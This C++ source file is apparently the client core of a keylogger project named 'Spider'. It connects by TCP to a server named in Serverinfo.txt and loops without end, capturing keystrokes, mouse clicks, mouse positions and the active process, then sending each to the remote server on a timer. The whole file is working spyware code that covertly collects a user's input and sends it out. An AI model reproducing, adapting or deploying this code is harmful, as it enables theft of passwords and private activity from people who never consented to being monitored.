#define _CRT_SECURE_NO_WARNINGS

#include "ClientCore.hpp"
#include "EventFactory.hpp"
#include "SpiderException.hpp"
#include <mmsystem.h>

ClientCore::ClientCore(boost::asio::io_service &service) : _service(service)
{
  this->_deviceManager.addDevice(KEYBOARD);
  this->_deviceManager.addDevice(MOUSE);
}

ClientCore::~ClientCore()
{
}

void	ClientCore::connect(boost::asio::ip::tcp::endpoint &endpoint)
{
  connectorPtr	connector(new TcpConnection(this->_service));

  connector->getSocket().async_connect(
    endpoint,
    boost::bind(&ClientCore::handleConnect, this, connector, boost::asio::placeholders::error)
  );
}

void	ClientCore::handleConnect(TcpConnection::SocketPtr connector, const boost::system::error_code &e)
{
  if (e.value() != 0)
    throw SpiderException("Cannot connect to the server specified in Serverinfo.txt");
  this->process(connector);
}

void ClientCore::process(TcpConnection::SocketPtr &connector)
{
  DWORD						now = timeGetTime();
  DWORD						sendKeyboardEvent = now + 9849;
  DWORD						sendMouseMoveEvent = now + 2345;
  DWORD						sendMouseClikEvent = now + 3579;
  std::string				proc_string;
  std::vector<std::string>	eventInformations;

  std::vector<Device*> DeviceVec;

  DeviceVec = this->_deviceManager.getDevice();
  while (TRUE)
  {
    this->_process.UpdateProcess();
    this->UpdateTimeStamp();
    static_cast<Keyboard*>(DeviceVec[0])->captureKey();
    static_cast<Mouse*>(DeviceVec[1])->ClikInformation();

    if (now >= sendKeyboardEvent)
    {
		{
			Event	event(this->_timestamp, this->_process, static_cast<Keyboard*>(DeviceVec[0])->getKey());

			connector->async_write(event, boost::bind(
				&ClientCore::handleWrite, this, boost::asio::placeholders::error
			));
			sendKeyboardEvent += 9849;
			static_cast<Keyboard*>(DeviceVec[0])->refreshTypedKey();
		}
    }

    if (now >= sendMouseMoveEvent)
    {
		static_cast<Mouse*>(DeviceVec[1])->MouseInformation();
		{
			Event	event(this->_timestamp, this->_process, static_cast<Mouse*>(DeviceVec[1])->getMousePosition());

			connector->async_write(event, boost::bind(
				&ClientCore::handleWrite, this, boost::asio::placeholders::error
			));
			sendMouseMoveEvent += 2345;
		}
    }

    if (now >= sendMouseClikEvent)
    {
		{
			Event	event(this->_timestamp, this->_process, static_cast<Mouse*>(DeviceVec[1])->getButtonPressed());
			connector->async_write(event, boost::bind(
				&ClientCore::handleWrite, this, boost::asio::placeholders::error
			));
			sendMouseClikEvent += 3579;
			static_cast<Mouse*>(DeviceVec[1])->refreshButtonPressed();

		}
    }
    now = timeGetTime();
  }
}

void	ClientCore::handleWrite(const boost::system::error_code &e) {}

void ClientCore::UpdateTimeStamp(void)
{
  std::time_t result = std::time(nullptr);
  this->_timestamp = static_cast<int>(result);
}

void ClientCore::UpdateCurrentProcess(void)
{
  this->_process.UpdateProcess();
}